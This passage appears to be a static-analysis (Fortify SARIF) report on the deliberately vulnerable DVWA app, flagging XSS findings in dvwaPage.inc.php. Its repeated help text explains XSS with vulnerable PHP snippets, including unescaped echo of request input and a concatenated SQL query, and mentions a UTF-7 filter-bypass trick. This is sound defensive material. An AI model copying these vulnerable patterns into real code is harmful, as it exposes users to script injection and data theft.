characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4654/?engineType=SCA&issue=BF11E3B3681BD18689DCE5DC975DAD9A"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4660",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4660/?engineType=SCA&issue=C39452248A222F8CBE83563BF94E8232"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4676",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4676/?engineType=SCA&issue=C850B6F6AF6E1F449D60A3E1031CF35C"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4691",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Poor Validation"
          },
          "fullDescription" : {
            "text" : "In dvwaPage.inc.php, the program uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.\n\n\n"
          },
          "help" : {
            "text" : "The use of certain encoding functions, such as htmlspecialchars() or htmlentities(), will prevent some, but not all cross-site scripting attacks. Depending on the context in which the data appear, characters beyond the basic &lt;, &gt;, &amp;, and \" that are HTML-encoded and those beyond &lt;, &gt;, &amp;, \", and ' (only when ENT_QUOTES is set) that are XML-encoded may take on meta-meaning. Relying on such encoding functions is equivalent to using a weak deny list to prevent cross-site scripting and might allow an attacker to inject malicious code that will be executed in the browser. Because accurately identifying the context in which the data appear statically is not always possible, the Fortify Secure Coding Rulepacks reports cross-site scripting findings even when encoding is applied and presents them as Cross-Site Scripting: Poor Validation issues.\n\nCross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, an untrusted source is most frequently a web request, and in the case of persistent (also known as stored) XSS -- it is the results of a database query.\n\n\nIn this case, the data enters at mysqli_query() in dvwaPage.inc.php on line 540.\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is weakly validated with HTML encoding and written out to a browser at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following code segment reads in the text parameter, from an HTTP request, HTML-encodes it, and displays it in an alert box in between script tags.\n\n\n&lt;?php\n    $var=$_GET['text'];\n    ...\n    $var2=htmlspecialchars($var);\n    echo \"&lt;script&gt;alert('$var2')&lt;/script&gt;\";\n?&gt;\n\n\nThe code in this example operates correctly if text contains only standard alphanumeric text. If text has a single quote, a round bracket and a semicolon, it ends the alert textbox thereafter the code will be executed.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- The application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4691/?engineType=SCA&issue=DAA62F9AFB6AB3BDF495EB2960B6FDEF"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4697",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) 